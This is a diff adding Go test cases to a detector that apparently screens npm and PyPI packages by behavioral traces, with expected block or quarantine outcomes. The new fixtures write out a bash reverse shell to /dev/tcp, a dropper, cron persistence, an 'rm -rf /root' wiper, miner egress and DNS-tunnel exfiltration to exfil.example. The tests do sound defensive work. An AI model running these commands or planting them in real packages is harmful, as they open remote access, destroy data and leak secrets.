@@ -120,6 +120,45 @@ func TestSyntheticTechniqueCorpus(t *testing.T) {
 			wantBlock: false,
 		},
 
+		// ---- behavioral: new-class traits (Plan 3) ----
+		{
+			name: "persistence-cron", prevalent: "cron/systemd persistence", eco: npm,
+			trace:     traceJSON([]behavior.FileOp{{Path: "/etc/cron.d/x", Write: true}}, nil, nil, nil),
+			wantBlock: true,
+		},
+		{
+			name: "reverse-shell", prevalent: "RAT/implant", eco: npm,
+			trace: traceJSON(nil, nil,
+				[]behavior.Command{{Command: []string{"bash", "-c", "bash -i >& /dev/tcp/1.2.3.4/4444 0>&1"}}}, nil),
+			wantBlock: true,
+		},
+		{
+			name: "dropper-download-execute", prevalent: "second-stage dropper", eco: npm,
+			trace: traceJSON([]behavior.FileOp{{Path: "/tmp/stage2", Write: true}}, nil,
+				[]behavior.Command{{Command: []string{"sh", "-c", "/tmp/stage2"}}}, nil),
+			wantBlock: true,
+		},
+		{
+			name: "cryptominer", prevalent: "coinminer payload", eco: npm,
+			trace:     traceJSON(nil, []behavior.Socket{{Address: "45.9.148.1", Port: 3333}}, nil, nil),
+			wantBlock: false, // mining-pool-egress high -> quarantine
+		},
+		{
+			name: "wiper-data-destruction", prevalent: "destructive/sabotage", eco: npm,
+			trace: traceJSON(nil, nil,
+				[]behavior.Command{{Command: []string{"sh", "-c", "rm -rf /root"}}}, nil),
+			wantBlock: true,
+		},
+		{
+			name: "dns-tunnel-exfil", prevalent: "DNS-tunnel exfil", eco: npm,
+			trace: traceJSON(nil, nil, nil, []behavior.DNSRecord{{Queries: []behavior.DNSQuery{
+				{Hostname: "YWJjZGVmZ2hpamtsbW5vcHFyc3R1.exfil.example"},
+				{Hostname: "MHhkZWFkYmVlZmNhZmViYWJlMDAx.exfil.example"},
+				{Hostname: "cXdlcnR5dWlvcGFzZGZnaGprbHo.exfil.example"},
+			}}}),
+			wantBlock: false, // dns-exfil high -> quarantine
+		},
+
 		// ---- benign controls: must NOT be flagged ----
 		{
 			name: "benign-clean-npm", prevalent: "control", eco: npm, benign: true,
@@ -136,6 +175,14 @@ func TestSyntheticTechniqueCorpus(t *testing.T) {
 			name: "benign-clean-pypi", prevalent: "control", eco: pypi, benign: true,
 			tarball: testutil.Wheel(map[string]string{"ok/__init__.py": "x = 1\n"}),
 			trace:   traceJSON(nil, nil, nil, []behavior.DNSRecord{dnsQ("files.pythonhosted.org")}),
+		},
+		{
+			name: "benign-native-build", prevalent: "control: node-gyp/gcc compile", eco: npm, benign: true,
+			trace: traceJSON(
+				[]behavior.FileOp{{Path: "build/Release/foo.node", Write: true}, {Path: "/root/.npm/_cacache/tmp/x", Write: true}},
+				nil,
+				[]behavior.Command{{Command: []string{"node-gyp", "rebuild"}}, {Command: []string{"gcc", "-c", "binding.cc"}}, {Command: []string{"uname", "-s"}}},
+				nil),
 		},
 	}
 
